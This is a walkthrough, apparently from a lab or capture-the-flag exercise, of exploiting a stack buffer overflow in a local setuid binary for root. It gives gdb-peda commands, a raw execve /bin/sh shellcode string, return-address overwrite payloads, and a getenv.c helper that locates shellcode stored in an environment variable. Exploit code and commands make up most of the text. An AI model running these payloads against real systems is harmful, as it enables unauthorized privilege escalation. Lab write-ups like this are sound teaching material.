## GDB

```bash

gdb /path/to/binary

checksec


NX and CANARY are disabled, which means the stack is executable and stack cookies to detect
overflows are not present on the stack.
ASLR (Address Space Layout Randomization) randomizes the base of the libraries (libc) so that the
memory address of libc functions changes on each run. ASLR is set to 0, which means the
addresses of the stack stay the same.
PIE (Positional Independent Executable) is enabled and it is like ASLR. It randomizes the base
address but in this case for the binary itself. This makes it difficult for us to use gadgets or
functions in the binary.
RELRO (Relocation Read-Only) is another technique to mitigate ROP (Return Oriented
Programming) attacks by making the GOT (Global Offset Table) read-only.
As the stack is executable, there is no need to use gadgets or functions from the binary, and
overwriting GOT entries is also not required. PIE and RELRO can be ignored in our case.

gdb-peda$ pattern_search

gdb-peda$ r $(python2 -c 'print "A"*<Offset number given from pattern_search>+"B"*8')

We can replace Bs with an address pointing to the location of our shellcode. The 64-bit shellcode
to call /bin/sh can be taken from here. Run the binary again with the pattern below.

In gdb, to find memory contents at a given address requires a specified format. x represents the
hex format. Lets examine 120 bytes of stack memory by issuing the command below.

gdb-peda$ x/120x $rsp


The shellcode is not visible. We can view the previous memory contents by subtracting RSP with 200
bytes.

gdb-peda$ x/120x $rsp-200


The shellcode is present in the second octet in the memory representation. The very next address
is 0x7fffffffe358 . We can calculate the shellcode address by removing 8 bytes from the next
address, 0x7fffffffe350 .


gdb-peda$ r $(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "A"*(88-27) + "\x50\xe3\xff\xff\xff\x7f"')


This is successful, but the shell returns as julian . This is because gdb does not elevate privileges when debugging a binary. Lets run the exploit outside of gdb.

As gdb stores environment variables on the stack, the address of the shellcode is different outside of gdb. The correct address can be achieved by bruteforcing the last two bytes in the address but thats not reliable.

We can perform the same attack by storing our shellcode in the env variable, and can then point the stack to the address of this variable.


export SHELLCODE=`python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`

```

## The address of the SHELLCODE variable can be obtained with the code below.


```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
char *ptr;
if(argc < 3) {
printf("Usage: %s <environment variable> <target program name>\n",
argv[0]);
exit(0);
}
ptr = getenv(argv[1]); /* get env var location */
ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
printf("%s will be at %p\n", argv[1], ptr);
}

```

```bash

nano getenv.c
gcc getenv.c -o getenv
chmod +x getenv
./getenv SHELLCODE /usr/sbin/readfile
SHELLCODE will be at 0x7fffffffe771

```


## A root shell can be obtained by running the final exploit.

```bash

/path/to/binary $(python2 -c 'print "A"*<Offset number given from pattern_search>+"\x71\xe7\xff\xff\xff\x7f"')

```
